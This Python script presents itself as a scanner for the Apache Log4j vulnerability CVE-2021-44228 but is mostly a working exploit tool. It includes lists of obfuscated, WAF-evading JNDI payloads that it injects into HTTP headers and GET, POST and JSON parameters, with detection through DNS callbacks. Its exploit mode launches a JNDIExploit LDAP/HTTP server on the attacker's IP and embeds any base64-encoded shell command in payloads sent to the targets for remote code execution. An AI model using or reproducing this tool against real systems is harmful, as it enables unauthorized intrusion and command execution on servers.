#!/usr/bin/env python3
# coding=utf-8

import argparse
import random
import requests
import time
import sys
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, parse_qs
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint
import os
import subprocess



# Disable SSL warnings
try:
	import requests.packages.urllib3
	requests.packages.urllib3.disable_warnings()
except Exception:
	pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "yellow")

if len(sys.argv) <= 1:
	print('\n%s -h for help.' % (sys.argv[0]))
	exit(0)


default_headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
	'Accept': '*/*'
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
						 "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
						 "${jndi:rmi://{{callback_host}}}",
						 "${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}",
						 "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}",
						 "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
						 "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
						 "${jndi:dns://{{callback_host}}}"]
waf_bypass_payloads_2 = ["${jndi:ldap://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}",
						 "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}",
						 "${${::-j}ndi:ldap://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}",
						 "${jndi:ldap://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}",
						 "${${lower:jndi}:${lower:ldap}://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}",
						 "${${lower:${lower:jndi}}:${lower:ldap}://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}",
						 "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}",
						 "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p}://{{user_ip}}:{{ldap_port}}/Basic/Command/Base64/{{payload}}}"]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
					dest="url",
					help="Check a single URL.",
					action='store')
parser.add_argument("-p", "--proxy",
					dest="proxy",
					help="send requests through proxy",
					action='store')
parser.add_argument("-l", "--list",
					dest="usedlist",
					help="Check a list of URLs.",
					action='store')
parser.add_argument("--request-type",
					dest="request_type",
					help="Request Type: (get, post) - [Default: get].",
					default="get",
					action='store')
parser.add_argument("--headers-file",
					dest="headers_file",
					help="Headers fuzzing list - [default: headers.txt].",
					default="headers.txt",
					action='store')
parser.add_argument("--exclude-user-agent-fuzzing",
					dest="exclude_user_agent_fuzzing",
					help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
					action='store_true')
parser.add_argument("--wait-time",
					dest="wait_time",
					help="Wait time after all URLs are processed (in seconds) - [Default: 1].",
					default=1,
					type=int,
					action='store')
parser.add_argument("--dns-callback-provider",
					dest="dns_callback_provider",
					help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
					default="interact.sh",
					action='store')
parser.add_argument("--custom-dns-callback-host",
					dest="custom_dns_callback_host",
					help="Custom DNS Callback Host.",
					action='store')
parser.add_argument("--waf-bypass",
					dest="waf_bypass_payloads",
					help="Extend scans with WAF bypass payloads.",
					action='store_true')
parser.add_argument("--run-all-tests-mod",
					dest="run_all_tests",
					help="Run all available tests - modified",
					action='store_true')
parser.add_argument("--custom-exploit",
					dest="custom_exploit",
					help="Custom HTTP Packet's [GET/POST Parameter] or [HTTP Header].",
					action='store_true')
parser.add_argument("--test",
					dest="test",
					help="Make Unique dns_callback_host_url for Manual Fuzzing.",
					action='store_true')
args = parser.parse_args()

proxies = {}
if args.proxy:
	proxies = {"http": args.proxy, "https": args.proxy}

def get_fuzzing_headers(payload):
	fuzzing_headers = {}
	fuzzing_headers.update(default_headers)
	with open(args.headers_file, "r") as f:
		for i in f.readlines():
			i = i.strip()
			if i == "" or i.startswith("#"):
				continue
			global current_header
			current_header=str(i)
			fuzzing_headers.update({i: payload})
	if args.exclude_user_agent_fuzzing:
		fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

	fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
	return fuzzing_headers


def get_fuzzing_post_data(payload):
	fuzzing_post_data = {}
	for i in post_data_parameters:
		fuzzing_post_data.update({i: payload})
	return fuzzing_post_data
	
def get_post_data(param_list,payload):
	post_data = {}
	for i in param_list:
		post_data.update({i: payload})
	return post_data


def generate_waf_bypass_payloads(callback_host, random_string):
	payloads = []
	for i in waf_bypass_payloads:
		new_payload = i.replace("{{callback_host}}", callback_host)
		new_payload = new_payload.replace("{{random}}", random_string)
		payloads.append(new_payload)
	return payloads
def generate_waf_bypass_payloads_2(user_ip,ldap_port,payload):
	payloads = []
	for i in waf_bypass_payloads_2:
		new_payload = i.replace("{{user_ip}}", user_ip)
		new_payload = new_payload.replace("{{ldap_port}}", ldap_port)
		new_payload = new_payload.replace("{{payload}}", payload)
		payloads.append(new_payload)
	return payloads


class Dnslog(object):
	def __init__(self):
		self.s = requests.session()
		req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
		self.domain = req.text

	def pull_logs(self):
		req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
		return req.json()


class Interactsh:
	# Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
	def __init__(self, token="", server=""):
		rsa = RSA.generate(2048)
		self.public_key = rsa.publickey().exportKey()
		self.private_key = rsa.exportKey()
		self.token = token
		self.server = server.lstrip('.') or 'interact.sh'
		self.headers = {
			"Content-Type": "application/json",
		}
		if self.token:
			self.headers['Authorization'] = self.token
		self.secret = str(uuid4())
		self.encoded = b64encode(self.public_key).decode("utf8")
		guid = uuid4().hex.ljust(33, 'a')
		guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
		self.domain = f'{guid}.{self.server}'
		self.correlation_id = self.domain[:20]

		self.session = requests.session()
		self.session.headers = self.headers
		self.register()

	def register(self):
		data = {
			"public-key": self.encoded,
			"secret-key": self.secret,
			"correlation-id": self.correlation_id
		}
		res = self.session.post(
			f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
		if 'success' not in res.text:
			raise Exception("Can not initiate interact.sh DNS callback client")
			
	def manual_log_url(self):
		result = []
		url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
		cprint("[•] Log URL --> %s"%url,"cyan")
		cprint("[•] Log Monitoring Start...","yellow")
		while 1:
			res = self.session.get(url, headers=self.headers, timeout=30).json()
			aes_key, data_list = res['aes_key'], res['data']
			for i in data_list:
				decrypt_data = self.__decrypt_data(aes_key, i)
				result.append(self.__parse_log(decrypt_data))
			if len(result) != 0:
				cprint("[•] Target Affected", "red")
				for j in result:
					cprint(j, "red")
				break
		
	def pull_logs(self):
		result = []
		url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
		cprint("[•] Log URL --> %s"%url,"cyan")
		res = self.session.get(url, headers=self.headers, timeout=30).json()
		aes_key, data_list = res['aes_key'], res['data']
		for i in data_list:
			decrypt_data = self.__decrypt_data(aes_key, i)
			result.append(self.__parse_log(decrypt_data))
		return result

	def __decrypt_data(self, aes_key, data):
		private_key = RSA.importKey(self.private_key)
		cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
		aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
		decode = base64.b64decode(data)
		bs = AES.block_size
		iv = decode[:bs]
		cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
		plain_text = cryptor.decrypt(decode)
		return json.loads(plain_text[16:])

	def __parse_log(self, log_entry):
		new_log_entry = {"timestamp": log_entry["timestamp"],
						 "host": f'{log_entry["full-id"]}.{self.domain}',
						 "remote_address": log_entry["remote-address"]
						 }
		return new_log_entry


def parse_url(url):
	# Url: https://example.com/login.jsp
	url = url.replace('#', '%23')
	url = url.replace(' ', '%20')

	if ('://' not in url):
		url = str("http://") + str(url)
	scheme = urlparse(url).scheme

	# FilePath: /login.jsp
	file_path = urlparse(url).path
	if (file_path == ''):
		file_path = '/'

	return({"scheme": scheme,
			"site": f"{scheme}://{urlparse(url).netloc}",
			"host":	urlparse(url).netloc.split(":")[0],
			"file_path": file_path})
			
def is_vulnerable2(dns_callback):
	time.sleep(args.wait_time)
	records = dns_callback.pull_logs()
	if len(records) == 0:
		cprint("[•] Targets does not seem to be vulnerable.", "green")
	else:
		cprint("[•] Target Affected", "red")
			
def is_vulnerable(i,dns_callback, tmp_method, tmp_params, payload):
	time.sleep(args.wait_time)
	records = dns_callback.pull_logs()
	if len(records) == 0:
		cprint("[•] Targets does not seem to be vulnerable.", "green")
	else:
		cprint("[•] Target Affected", "red")
		print("[•] Affected Header --> ",end='')
		cprint(i,"yellow")
		print("[•] Method --> ",end='')
		cprint(tmp_method,"yellow")
		print("[•] Params --> ",end='')
		cprint(tmp_params,"yellow")
		print("[•] Payload --> ",end='')
		cprint(payload,"yellow")
		for i in records:
			cprint(i, "red")	
			
def exploit_send(url,exploit_payload):
	try:
		requests.request(url=url,
							 method="GET",
							 params={"v": exploit_payload},
							 headers=get_fuzzing_headers(exploit_payload),
							 verify=False,
							 timeout=timeout,
							 proxies=proxies)
	except Exception as e:
			cprint(f"EXCEPTION: {e}")	
	try:
		# Post body
		requests.request(url=url,
						 method="POST",
						 params={"v": exploit_payload},
						 headers=get_fuzzing_headers(exploit_payload),
						 data=get_fuzzing_post_data(exploit_payload),
						 verify=False,
						 timeout=timeout,
						 proxies=proxies)
	except Exception as e:
		cprint(f"EXCEPTION: {e}")
	try:
		# JSON body
		requests.request(url=url,
						 method="POST",
						 params={"v": exploit_payload},
						 headers=get_fuzzing_headers(exploit_payload),
						 json=get_fuzzing_post_data(exploit_payload),
						 verify=False,
						 timeout=timeout,
						 proxies=proxies)
	except Exception as e:
		cprint(f"EXCEPTION: {e}")
		
# input http header/cookie		
def input_header():
	want_header = input("$ Want to input 'Custom HTTP HEADER'? y/n : ")
	if(want_header == 'y'):
		http_headers = {}
		while 1:
			cprint("- Want to stop input, Please input 'stop'.","cyan")
			add_header = input("$ Input HTTP HEADER [Name] : ")
			if(add_header == 'stop'):
				break
			add_header_value = input("$ Input HTTP HEADER [Value] : ")
			if(add_header_value == 'stop'):
				break
			http_headers.update({add_header: add_header_value})
		return http_headers			
		
	elif(want_header == 'n'):
		cprint("[+] Use Default HTTP Header.","yellow")
		http_headers = {}
		http_headers.update(default_headers)
		cprint("[+] Default HTTP Header Value : %s"%default_headers,"yellow")
		return http_headers
		
	
	
def test_get(url, callback_host):
	parsed_url = parse_url(url)
	random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
	payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], dns_callback_host, random_string)
	payloads = [payload]
	if args.waf_bypass_payloads:
		payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{dns_callback_host}', random_string))
	for payload in payloads:
		cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
		
		# GET
		try:
			requests.request(url=url,
							 method="GET",
							 params="",
							 headers=default_headers,
							 verify=False,
							 timeout=timeout)
			tmp_method = "GET"
			tmp_params = url
		except Exception as e:
			cprint(f"EXCEPTION: {e}")
		is_vulnerable(default_headers,dns_callback, tmp_method, tmp_params, payload)
		
def scan_url(url, callback_host):
	parsed_url = parse_url(url)
	random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
	payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
	payloads = [payload]
	if args.waf_bypass_payloads:
		payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
	for payload in payloads:
		cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
		if args.request_type.upper() == "GET" or args.run_all_tests:
			try:
				requests.request(url=url,
								 method="GET",
								 params={"v": payload},
								 headers=get_fuzzing_headers(payload),
								 verify=False,
								 timeout=timeout,
								 proxies=proxies)
			except Exception as e:
				cprint(f"EXCEPTION: {e}")

		if args.request_type.upper() == "POST" or args.run_all_tests:
			try:
				# Post body
				requests.request(url=url,
								 method="POST",
								 params={"v": payload},
								 headers=get_fuzzing_headers(payload),
								 data=get_fuzzing_post_data(payload),
								 verify=False,
								 timeout=timeout,
								 proxies=proxies)
			except Exception as e:
				cprint(f"EXCEPTION: {e}")

			try:
				# JSON body
				requests.request(url=url,
								 method="POST",
								 params={"v": payload},
								 headers=get_fuzzing_headers(payload),
								 json=get_fuzzing_post_data(payload),
								 verify=False,
								 timeout=timeout,
								 proxies=proxies)
			except Exception as e:
				cprint(f"EXCEPTION: {e}")
				
def make_unique_host_url(url, dns_callback):
	parsed_url = parse_url(url)
	random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
	payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], dns_callback.domain, random_string)
	payloads = [payload]
	if args.waf_bypass_payloads:
		payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{dns_callback.domain}', random_string))
	for payload in payloads:
		cprint(f"[•] Target : {url} | PAYLOAD: {payload}", "cyan")

def scan_url2(url, dns_callback):
	parsed_url = parse_url(url)
	random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
	payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], dns_callback.domain, random_string)
	payloads = [payload]
	if args.waf_bypass_payloads:
		payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{dns_callback.domain}', random_string))
	for payload in payloads:
		cprint(f"[•] Target : {url} | PAYLOAD: {payload}", "cyan")
		
		# GET/POST/JSON Parameter Exploit 
		cprint(f"--------- Start GET/POST Parameter Test ---------","cyan")
		cprint(f"[+] Try [GET] Method.", "cyan")
		try:
			requests.request(url=url,
							 method="GET",
							 params={"v": payload},
							 headers=default_headers,
							 verify=False,
							 timeout=timeout)
			tmp_method = "GET"
			tmp_params = "?v=%s"%payload
		except Exception as e:
			cprint(f"EXCEPTION: {e}")
		is_vulnerable(default_headers,dns_callback, tmp_method, tmp_params, payload)

		cprint(f"[+] Try [POST] Method.", "cyan")
		try:
			# Post body
			requests.request(url=url,
							 method="POST",
							 params={"v": payload},
							 headers=default_headers,
							 data=get_fuzzing_post_data(payload),
							 verify=False,
							 timeout=timeout)
			tmp_method = "POST"
			tmp_params = "POST DATA : v=%s"%payload
		except Exception as e:
			cprint(f"EXCEPTION: {e}")
		is_vulnerable(default_headers,dns_callback, tmp_method, tmp_params, payload)
		
		cprint(f"[+] Try [POST_JSON] Method.", "cyan")
		try:
			# JSON body
			requests.request(url=url,
							 method="POST",
							 params="",
							 headers=default_headers,
							 json=get_fuzzing_post_data(payload),
							 verify=False,
							 timeout=timeout)
			tmp_method = "POST_JSON"
			tmp_params = "POST JSON DATA : v=%s"%payload
		except Exception as e:
			cprint(f"EXCEPTION: {e}")
		is_vulnerable(default_headers,dns_callback, tmp_method, tmp_params, payload)

		# HTTP Header Exploit
		cprint(f"--------- Start HTTP Header Test ---------","cyan")
		fuzzing_headers = {}
		fuzzing_headers.update(default_headers)
		with open(args.headers_file, "r") as f:
			for i in f.readlines():
				i = i.strip()
				if i == "" or i.startswith("#"):
					continue
				fuzzing_headers.update({i: payload})
				cprint(f"[+] Try [%s] Header."%i,"cyan")
				if args.exclude_user_agent_fuzzing:
					fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
				fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
				cprint(f"[-] Try [GET] Method.", "cyan")
				try:
					requests.request(url=url,
									 method="GET",
									 params="",
									 headers=fuzzing_headers,
									 verify=False,
									 timeout=timeout)
					tmp_method = "GET"
					tmp_params = "N/A"
				except Exception as e:
					cprint(f"EXCEPTION: {e}")
				is_vulnerable(i,dns_callback, tmp_method, tmp_params, payload)

				cprint(f"[-] Try [POST] Method.", "cyan")
				try:
					# Post body
					requests.request(url=url,
									 method="POST",
									 params="",
									 headers=fuzzing_headers,
									 data="",
									 verify=False,
									 timeout=timeout)
					tmp_method = "POST"
					tmp_params = "N/A"
				except Exception as e:
					cprint(f"EXCEPTION: {e}")
				is_vulnerable(i,dns_callback, tmp_method, tmp_params, payload)			

def createServer(userip, lport, hport):
	cprint("You should set JAVA in env path. ","yellow")
	cmd1 = ("java -jar ./ldaphttp/JNDIExploit-1.2-SNAPSHOT_zaybxc0414.jar -i %s -l %s -p %s &")%(userip,lport,hport)
	os.system(cmd1)
	time.sleep(5)

# --------- M A I N ---------
"""
MAIN FUNCTION
"""
def main():
	urls = []
	if args.url:
		urls.append(args.url)
	if args.usedlist:
		with open(args.usedlist, "r") as f:
			for i in f.readlines():
				i = i.strip()
				if i == "" or i.startswith("#"):
					continue
				urls.append(i)
				
	dns_callback_host = ""
		
	if args.custom_dns_callback_host:
		cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
		dns_callback_host =	args.custom_dns_callback_host
	else:
		cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).","cyan")
		if args.dns_callback_provider == "interact.sh":
			dns_callback = Interactsh()
		elif args.dns_callback_provider == "dnslog.cn":
			dns_callback = Dnslog()
		else:
			raise ValueError("Invalid DNS Callback provider")
		dns_callback_host = dns_callback.domain
	if args.test:
		for url_1 in urls:
			make_unique_host_url(url_1, dns_callback)
			dns_callback.manual_log_url()
		exit(1)
		
	# Custom Exploit			
	if args.custom_exploit:
		cprint("$ You choose Custom Exploit (Target - HTTP GET/POST Parameter)","yellow")
		cprint("\tGET\t-->\t1\n\tPOST\t-->\t2\n\t","yellow")
		httpmethod = input("$ Select Number : ")
		
		# Select GET
		if(httpmethod == "1"):
			cprint("[+] You Select [GET] Method.","yellow")
			get_url = input("$ Input Target URL with Parameters : ")
			parts = urlparse(str(get_url))
			qs = parse_qsl(parts.query)
			userip = input("$ Input Your IP : ")
			lport = input("$ Input LDAP Server Port (ex. 1389) : ")
			hport = input("$ Input HTTP Server Port (ex. 8888) : ")		
			createServer(userip, lport, hport)
			cprint("[+] %s Server Started (LDAP : %s / HTTP : %s)"%(userip,lport,hport),"yellow")
			
			exploit_cmd = input("$ Input Exploit command line (ex. touch /tmp/pwn) : ")
			b64_exploit_cmd = base64.b64encode(exploit_cmd.encode("utf8")).decode("utf8")		
			payloads = []
			payloads.extend(generate_waf_bypass_payloads_2(userip,lport,b64_exploit_cmd))
			cprint("[+] Sample Payload --> ${jndi:ldap://%s:%s/Basic/Command/Base64/%s}"%(userip,lport,b64_exploit_cmd),"cyan")
			http_header = input_header()
			for exploit_payload in payloads:
				cprint("\n[*] Exploit_payload : %s "%exploit_payload,"yellow")
				for i in range(len(qs)):	
					qs[i] = list(qs[i])
					qs[i][1] = exploit_payload
					qs[i] = tuple(qs[i])
				parts = parts._replace(query=urlencode(qs))
				new_url = urlunparse(parts)
				cprint("[+] Exploit URL --> %s"%str(new_url),"yellow")
				#http_header = input_header()
				try:
					requests.request(url=new_url,
									 method="GET",
									 params="",
									 headers=http_header,
									 verify=False,
									 timeout=timeout)
				except Exception as e:
					cprint(f"EXCEPTION: {e}")
				time.sleep(0.5)
			cprint("[+] Exploit Done / Check Response.","cyan")
			os.system("kill $(ps -ef | grep -v grep | grep zay | awk '{print $2}')")
			
			
		# Select POST
		elif(httpmethod == "2"):
			cprint("[+] You Select [POST] Method.","yellow")
			get_url_1 = input("$ Input Target URL : ")
			get_param = input("$ Input POST Parameters : ")
			get_param = "?"+get_param
			parts = urlparse(str(get_param))
			qs = parse_qsl(parts.query)
			userip = input("$ Input Your IP : ")
			lport = input("$ Input LDAP Server Port (ex. 1389) : ")
			hport = input("$ Input HTTP Server Port (ex. 8888) : ")		
			createServer(userip, lport, hport)
			cprint("[+] %s Server Started (LDAP : %s / HTTP : %s)"%(userip,lport,hport),"yellow")
			
			exploit_cmd = input("$ Input Exploit command line (ex. touch /tmp/pwn) : ")
			b64_exploit_cmd = base64.b64encode(exploit_cmd.encode("utf8")).decode("utf8")		
			payloads = []
			payloads.extend(generate_waf_bypass_payloads_2(userip,lport,b64_exploit_cmd))
			cprint("[+] Sample Payload --> ${jndi:ldap://%s:%s/Basic/Command/Base64/%s}"%(userip,lport,b64_exploit_cmd),"cyan")
			http_header = input_header()
			for exploit_payload in payloads:
				cprint("[*] Exploit_payload : %s "%exploit_payload,"yellow")
				for i in range(len(qs)):	
					qs[i] = list(qs[i])
					qs[i][1] = exploit_payload
					qs[i] = tuple(qs[i])
				parts = parts._replace(query=urlencode(qs))
				new_param = urlunparse(parts)
				new_param = new_param[1:]
				cprint("[+] Exploit POST Parameters --> %s"%str(new_param),"yellow")
				#http_header = input_header()
				#print http_header
				#print(parse_qs(new_param))
				try:
					response = requests.request(url=get_url_1,
									 method="POST",
									 data=parse_qs(new_param),
									 headers=http_header,
									 verify=False,
									 timeout=timeout)
				except Exception as e:
					cprint(f"EXCEPTION: {e}")
				time.sleep(0.5)
			cprint("[+] Exploit Done / Check Response.","cyan")
			os.system("kill $(ps -ef | grep -v grep | grep zay | awk '{print $2}')")
			
	# Non Custom Exploit
	else:	
	# Full_header scan (origin_code) 
		for url2 in urls:
			scan_url(url2, dns_callback_host)
		time.sleep(args.wait_time)
		records2 = dns_callback.pull_logs()
		if len(records2) == 0:
			cprint("[•] Targets does not seem to be vulnerable.", "green")
		else:
			cprint("[•] Target Affected", "red")
			for j in records2:
				cprint(j, "red")
			
	#-------------------- EXPLOIT --------------------
		v1 = input("$ Want to do Exploit? y/n : ")
		if(v1 == 'y'):
			# Run HTTP/LDAP Server
			userip = input("$ Input Your IP : ")
			lport = input("$ Input LDAP Server Port (ex. 1389) : ")
			hport = input("$ Input HTTP Server Port (ex. 8888) : ")		
			createServer(userip, lport, hport)
			print("[+] %s Server Started (LDAP : %s / HTTP : %s)"%(userip,lport,hport))
			
			exploit_cmd = input("$ Input Exploit command line (ex. touch /tmp/pwn) : ")
			b64_exploit_cmd = base64.b64encode(exploit_cmd.encode("utf8")).decode("utf8")		
			exploit_payload = ("${jndi:ldap://%s:%s/Basic/Command/Base64/%s}")%(userip,lport,b64_exploit_cmd)
			print("[*] exploit_payload : %s "%exploit_payload)
			
			for url3 in urls:
				exploit_send(url3,exploit_payload)	
			# -- Exploit Done --
			
		elif(v1 == 'n'):			
			v2 = input("$ Want to find vulnerable point? (Just HTTP Header) y/n : ")
			if(v2 == 'y'):
				dns_callback_host = ""
				if args.custom_dns_callback_host:
					cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
					dns_callback_host =	args.custom_dns_callback_host
				else:
					cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).","cyan")
					if args.dns_callback_provider == "interact.sh":
						dns_callback = Interactsh()
					elif args.dns_callback_provider == "dnslog.cn":
						dns_callback = Dnslog()
					else:
						dns_callback = Interactsh()
					dns_callback_host = dns_callback.domain			
	# ----- Find Vulnerable Point -------------------	
				for url in urls:
					scan_url2(url,dns_callback)
			elif(v2 == 'n'):
				print("")
								
			#------------------------------------------------------------------------	

		if args.custom_dns_callback_host:
			cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
			return
		cprint("[•] Done.", "cyan")
		os.system("kill $(ps -ef | grep -v grep | grep zay | awk '{print $2}')")


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("\nKeyboardInterrupt Detected.")
		print("Exiting...")
		os.system("kill $(ps -ef | grep -v grep | grep zay | awk '{print $2}')")
		exit(0)
